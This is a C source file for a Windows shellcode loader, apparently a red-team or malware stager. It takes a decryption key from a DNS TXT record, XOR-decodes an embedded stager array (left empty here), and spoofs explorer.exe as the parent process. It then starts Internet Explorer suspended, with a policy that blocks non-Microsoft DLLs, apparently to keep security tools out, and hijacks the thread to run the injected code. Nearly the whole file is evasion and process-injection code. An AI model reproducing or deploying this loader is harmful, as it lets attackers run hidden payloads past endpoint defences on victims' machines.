#define _WIN32_WINNT 0x0A00

#include <windows.h>
#include <windns.h>
#include <tlhelp32.h>

#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x00000001ull << 44)


unsigned char stager[] = { 
};


DWORD getKey(void) {
	PDNS_RECORD txtData;
	DNS_STATUS status;

	
	status = DnsQuery_A("domain.com", DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &txtData, NULL);
	if (status != 0) {
		return 0;
	}

	// Return 4 bytes back from TXT record
	return *(DWORD*)(*txtData->Data.Txt.pStringArray);
}

void decode(DWORD key, const unsigned char *input, char *output, DWORD len) {
	int i = 0;

	for (i = 0; i < len; i+=4) {
		*(DWORD*)(output+i) = *(DWORD *)(input+i) ^ key;
		key++;
	}
}

BOOL injectPayload(HANDLE hProc, HANDLE hThread, char* payload, DWORD len) {
	HANDLE proc;
	void* alloc;
	DWORD bytesWritten;
	DWORD threadId;
	CONTEXT context;

	alloc = VirtualAllocEx(hProc, 0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (alloc == NULL) {
		return FALSE;
	}

	if (!WriteProcessMemory(hProc, alloc, payload, len, &bytesWritten)) {
		return FALSE;
	}

	context.ContextFlags = CONTEXT_CONTROL;
	GetThreadContext(hThread, &context);

	context.Eip = (DWORD)alloc;

	SetThreadContext(hThread, &context);

	ResumeThread(hThread);
}

BOOL launchProcess(const char* path, DWORD ppid, HANDLE *hProc, HANDLE *hThread) {
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	DWORD size;
	HANDLE ppHandle;

	// Open PPID process
	ppHandle = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	// Required for a STARTUPINFOEXA
	ZeroMemory(&si, sizeof(si));
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

	// Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
	InitializeProcThreadAttributeList(NULL, 2, 0, &size);

	// Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);

	// Initialise our list 
	InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);

	// Enable blocking of non-Microsoft signed DLLs
	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	// Assign our attribute
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ppHandle, sizeof(HANDLE), NULL, NULL);

	if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, (STARTUPINFO*)&si, &pi)) {
		return FALSE;
	}

	*hThread = pi.hThread;
	*hProc = pi.hProcess;

	return TRUE;
}

DWORD findProcessByName(const char* processName) {
	HANDLE snapshot;
	PROCESSENTRY32 pe;
	BOOL done;

	ZeroMemory(&pe, sizeof(PROCESSENTRY32));
	pe.dwSize = sizeof(PROCESSENTRY32);

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	done = Process32First(snapshot, &pe);

	do {
		if (_strnicmp(pe.szExeFile, processName, sizeof(pe.szExeFile)) == 0) {
			return pe.th32ProcessID;
		}
	} while (Process32Next(snapshot, &pe));

	return 0;
}

int main()
{
	DWORD oldProtect;
	DWORD pid, ppid;
	void* decryptedStager;
	DWORD key;
	HANDLE hProc, hThread;

	decryptedStager = VirtualAlloc(NULL, sizeof(stager), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	key = getKey();

	// Decode stager
	decode(key, stager, (char*)decryptedStager, sizeof(stager));

	// PPID process
	ppid = findProcessByName("explorer.exe");

	// Launch suspended process
	pid = launchProcess("C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe", ppid, &hProc, &hThread);

	// Inject into the process
	injectPayload(hProc, hThread, (char*)decryptedStager, sizeof(stager));
}